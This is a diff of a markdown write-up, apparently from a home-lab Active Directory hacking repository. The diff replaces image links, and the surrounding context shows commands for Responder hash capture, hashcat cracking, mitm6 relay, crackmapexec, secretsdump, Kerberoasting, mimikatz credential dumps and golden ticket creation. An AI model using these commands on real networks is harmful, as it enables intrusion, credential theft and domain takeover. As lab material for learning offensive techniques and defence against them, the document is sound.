@@ -27,7 +27,7 @@ On a Windows 10 x64 machine, type ‘\\192.168.254.128’ into the file explorer
 
 This gets you the following from the responder:
 
-![alt text](https://cdn.discordapp.com/attachments/750764502181740564/1265465407075123270/image.png?ex=66a19c00&is=66a04a80&hm=785901b91835a790a2766e2c6fff1aa24fc43779c88677010cec52d92418e48b&)
+![alt text](https://github.com/AriT000/ActiveDirectoryHack/blob/main/image(3).png)
 
 
 Now that we have the username and password hash, we can crack the password using a tool like hashcat.
@@ -40,7 +40,7 @@ Then run hashcat on command prompt in administrator mode by using the command �
 
 This gets you the following from hashcat:
 
-![alt text](https://cdn.discordapp.com/attachments/750764502181740564/1265465712277979166/image.png?ex=66a19c49&is=66a04ac9&hm=731dd02bfdf997d67878e943d72d87203eab122cf83e5f33572042ee6d3ff423&)
+![alt text](https://github.com/AriT000/ActiveDirectoryHack/blob/main/image(4).png)
 
 The password was revealed to be Password1.
 <br/>
@@ -132,19 +132,19 @@ Then we set up the relay attack using ntlm with the following command
 
 Then to speed it up, just reboot a machine connected to the domain controller to trigger an event for mitm6. Once this happens, we wait to see an authentication success from running ntlm, which we can then check the lootme folder.
 
-![alt text](https://cdn.discordapp.com/attachments/750764502181740564/1265468434154786886/image.png?ex=66a19ed1&is=66a04d51&hm=cc14740edb8717f909a7eb782ddba85811f875b304842fccce5eb172ae1c5bae&)
+![alt text](https://github.com/AriT000/ActiveDirectoryHack/blob/main/image(5).png)
 
 Opening domain_users_by_group.html gives us the following:
 
-![alt text](https://cdn.discordapp.com/attachments/750764502181740564/1265468721120677969/image.png?ex=66a19f16&is=66a04d96&hm=37231340f19c3ade459e39da89e016a6f9cf3fc92cae770b0e5a7e0a1546e1f7&)
+![alt text](https://github.com/AriT000/ActiveDirectoryHack/blob/main/image(6).png)
 
 Once the admin logs into the domain controller, it will create a new user and password:
 
-![alt text](https://cdn.discordapp.com/attachments/750764502181740564/1265469288605552740/image.png?ex=66a19f9d&is=66a04e1d&hm=fd7da1561baf08ab429202c3a83e4c0da8cd8004ebada98ae6d4b09f52973fe5&)
+![alt text](https://github.com/AriT000/ActiveDirectoryHack/blob/main/image(7).png)
 
 Then you should see the new account in the domain controller:
 
-![alt text](https://cdn.discordapp.com/attachments/750764502181740564/1265469321573040138/image.png?ex=66a19fa5&is=66a04e25&hm=63eec78cb1a9ebd41960989691b2f42e9a0beaf0b4622e32c1d5c78fa3ac2bf1&)
+![alt text](https://github.com/AriT000/ActiveDirectoryHack/blob/main/image(8).png)
 
 #
 
@@ -256,11 +256,11 @@ Copy this zip file to Kali and upload the data to bloodhound.
 
 You can see the shortest path to domain is through the circled user:
 
-![alt text](https://cdn.discordapp.com/attachments/750764502181740564/1265477682561286224/image.png?ex=66a1a76e&is=66a055ee&hm=80b7f22dbec38247eb65df3a16aeb873dec3f09cb5728875d50144132d2a3e19&)
+![alt text](https://github.com/AriT000/ActiveDirectoryHack/blob/main/image(9).png)
 
 You can also see high value targets as well:
 
-![alt text](https://cdn.discordapp.com/attachments/750764502181740564/1265482340981936262/image.png?ex=66a1abc5&is=66a05a45&hm=953143562d95d9d3594867ea9525628f9636b42fb36891fff62fc07f3b0ae8e4&)
+![alt text](https://github.com/AriT000/ActiveDirectoryHack/blob/main/image(10).png)
 
 #
 
@@ -277,24 +277,23 @@ This attack is a post-compromise attack that passes a compromised hash/password 
 We install and use a tool called “crackmapexec” and run the command ‘crackmapexec 192.168.57.0./24 -u fcastle -d MARVEL.local -p Password1’ with a specified domain IP address, user, domain name, and compromised password:
 
 
-![alt text](https://cdn.discordapp.com/attachments/750764502181740564/1265680740272570389/image.png?ex=66a3b60b&is=66a2648b&hm=fca5d1b18e2ed1b4096de475316b390c86701b06e36b23174a1d7e73ab3a9408)
+![alt text](https://github.com/AriT000/ActiveDirectoryHack/blob/main/image(11).png)
 
 This shows us that the users SPIDERMAN and THEPUNISHER has the same password as the compromised password we specified. HYDRA-DC did not work because there’s no SMB access.
 
 Then we can use psexec to gain remote access to a user, where “marvel/fcastle” is the user, “Password1” is the password, and the IP of the target machine is “192.168.254.130”:
 
 
-![alt text](https://cdn.discordapp.com/attachments/750764502181740564/1265680548731424850/image.png?ex=66a3b5de&is=66a2645e&hm=19b5b6c4186701a5f7cedcd3eedb20e2016e14d07f1928f6e2093d3924ecb163&)
+![alt text](https://github.com/AriT000/ActiveDirectoryHack/blob/main/image(12).png)
 
 *Note: there is a lockout policy on domain accounts where testing multiple passwords can lock you out of the account, but local accounts do not have this lockout policy.
 
 You can then find the hashes of the accounts on the domain using ‘secretsdump.py marvel/fcastle:Password1@192.168.254.130’ which has the same syntax as the psexec command, which gets you the following:
 
-![alt text](https://cdn.discordapp.com/attachments/750764502181740564/1266185483524767794/image.png?ex=66a43a9f&is=66a2e91f&hm=3668a3c82eecbf65c951728497f0ca591e9bca0ddaecf2d324d1e520da11a969&)
-
+![alt text](https://github.com/AriT000/ActiveDirectoryHack/blob/main/image(13).png)
 You can take these hashes offline and crack them by putting them in a txt file and running the command ‘hashcat64.exe -m 1000 hashes.txt rockyou.txt -O’:
 
-![alt text](https://cdn.discordapp.com/attachments/750764502181740564/1266185521072443413/image.png?ex=66a43aa8&is=66a2e928&hm=d065a0b1b961ba56d2d448898fa1b637c5e0bf7aa6bb6407eacf1079584a663a&)
+![alt text](https://github.com/AriT000/ActiveDirectoryHack/blob/main/image(14).png)
 
 *One of the passwords is hidden possibly because the account is disabled.
 
@@ -348,11 +347,11 @@ Use ‘show targets’ and set target to native upload using ‘set target 2’.
 Set lhost using ‘set lhost eth0’.
 Using ‘options’:
 
-![alt text](https://cdn.discordapp.com/attachments/750764502181740564/1265772246123679805/image.png?ex=66a36284&is=66a21104&hm=011dca106d79fd99339881f93e3deeedf4023fbe766594fa7042a1e870e9dfbb&)
+![alt text](https://github.com/AriT000/ActiveDirectoryHack/blob/main/image(15).png)
 
 Then use ‘run’ to start the session.
 
-![alt text](https://cdn.discordapp.com/attachments/750764502181740564/1265782333651550208/image.png?ex=66a36be9&is=66a21a69&hm=63402f3fc4732aafcb7afd58b0854a48f8623eb4acd8f1daae9c01acfe23ced2&)
+![alt text](https://github.com/AriT000/ActiveDirectoryHack/blob/main/image(16).png)
 
 
 We can use ‘hashdump’ to see the hashes.
@@ -366,7 +365,7 @@ List tokens by usernames using ‘list_tokens -u’.
 Then impersonate a token by using ‘impersonate_token marvel\\fcastle’.
 
 
-![alt text](https://cdn.discordapp.com/attachments/750764502181740564/1265782078201401434/image.png?ex=66a36bac&is=66a21a2c&hm=7b342df0359749e58002a6a35f9e030815e3f73bbd044544819238ab6eccf23a&)
+![alt text](https://github.com/AriT000/ActiveDirectoryHack/blob/main/image(17).png)
 
 *note. Use ‘rev2self’ to go back to meterpreter.
 
@@ -400,13 +399,13 @@ Kerberoasting is an attack where the Kerberos ticket-granting ticket can be extr
 
 We can start by retrieving the hash from the SQL Service within the domain with the following command where we provide the domain IP: ‘GetUserSPNs.py marvel.local/fcastle:Password1 -dc-ip 192.168.254.129 -request’.
 
-![alt text](https://cdn.discordapp.com/attachments/750764502181740564/1265810924451790858/image.png?ex=66a3868a&is=66a2350a&hm=3fad397ae41c6d029cab86fe4f75c9cba10e6f63e1021fc292d6ebc4a29dded1&)
+![alt text](https://github.com/AriT000/ActiveDirectoryHack/blob/main/image(18).png)
 
 We can then take this hash offline and crack it using ‘hashcat.exe -m 13100 hashes4.txt rockyou.txt -O’
 
 We can see that the password was successfully cracked and found to be “MYpassword123#”
 
-![alt text](https://cdn.discordapp.com/attachments/750764502181740564/1266187734049882232/image.png?ex=66a43cb8&is=66a2eb38&hm=70ea840fbe7adef8c76994e77308d09f6880ca3e406d3d00c62709858d9e4735&)
+![alt text](https://github.com/AriT000/ActiveDirectoryHack/blob/main/image(19).png)
 
 In this case, the SQL service account was mistakenly set as a domain admin, which opens a bunch of doors such as access to the domain controller.
 
@@ -458,13 +457,13 @@ In cmd on the DC, we run mimikatz using ‘mimikatz.exe’ in the x64 folder, th
 
 Then we can run ‘sekurlsa::logonpasswords’ to get hashes of passwords of users that have logged on recently like the DC and administrators.
 
-![alt text](https://cdn.discordapp.com/attachments/750764502181740564/1266174880706203758/image.png?ex=66a430bf&is=66a2df3f&hm=0d54d5a34effc7e378d95830bbf246bf8385ee01316c55a050e726810cb2806e&)
+![alt text](https://github.com/AriT000/ActiveDirectoryHack/blob/main/image(20).png)
 
 *Note: if there’s enough time, we can use a feature called wdigest, which stores passwords in plaintext. This feature has been patched but it’s still available to be turned on and it will show passwords for whoever logs in next.
 
 Using ‘lsadump::lsa /patch’ allows you to dump the lsa (local security authority), which is a logon session authenticator:
 
-![alt text](https://cdn.discordapp.com/attachments/750764502181740564/1266188578015285258/image.png?ex=66a43d81&is=66a2ec01&hm=d9e7d1c22b1c5cba660fbb6077d36f3ddbb05c964b6948981f1cc301808e6f28&)
+![alt text](https://github.com/AriT000/ActiveDirectoryHack/blob/main/image(21).png)
 
 
 You can see that it dumps usernames and NTLM hashes for those usernames, which can be taken offline and cracked.
@@ -491,16 +490,16 @@ Then use ‘lsadump::lsa /inject /name:krbtgt’, where krbtgt stands for kerber
 
 This will show a bunch of hashes as well as wdigest:
 
-![alt text](https://cdn.discordapp.com/attachments/750764502181740564/1266179899547324519/image.png?ex=66a4356c&is=66a2e3ec&hm=f731c86a43fbd89399cac06d5a675f4150bc8875dc6cbb414bf785f1cab3fa95&)
+![alt text](https://github.com/AriT000/ActiveDirectoryHack/blob/main/image(22).png)
 
 Not the following information:
 Domain SID:
 
-![alt text](https://cdn.discordapp.com/attachments/750764502181740564/1266180696880189571/image.png?ex=66a4362a&is=66a2e4aa&hm=e112cd66a396b29e131f9257c9c8852c84f6dd047c292a467a200c793bdf2b35&)
+![alt text](https://github.com/AriT000/ActiveDirectoryHack/blob/main/image(23).png)
 
 krbtgt NTLM hash:
 
-![alt text](https://cdn.discordapp.com/attachments/750764502181740564/1266181457232138341/image.png?ex=66a436df&is=66a2e55f&hm=e50248a4d57c1f76651cc539284484e6717ccc31a60df1f0cd4c5d6c15c0ef2a&)
+![alt text](https://github.com/AriT000/ActiveDirectoryHack/blob/main/image(24).png)
 
 
 In order to generate the golden ticket we use the command and the above information ‘kerberos::golden /User:Administrator /domain:marvel.local /sid:S-1-5-21-3103577861-2553214869-2910503120 /krbtgt:7380a637b4fed63264d3d9e161b87c7b /id:500 /ptt’
@@ -511,7 +510,7 @@ In order to generate the golden ticket we use the command and the above informat
 Now we can access other computers and their directories like the computer THEPUNISHER for example. Using ‘misc::cmd’ to open another cmd with the same session then ‘dir \\THEPUNISHER\c$’
 
 
-![alt text](https://cdn.discordapp.com/attachments/750764502181740564/1266183531114270761/image.png?ex=66a438ce&is=66a2e74e&hm=fe80dc731634cc9068331d3c41b0b30889cc34de7a9ae83daace23fa8b2e3483&)
+![alt text](https://github.com/AriT000/ActiveDirectoryHack/blob/main/image(25).png)
 
 
 
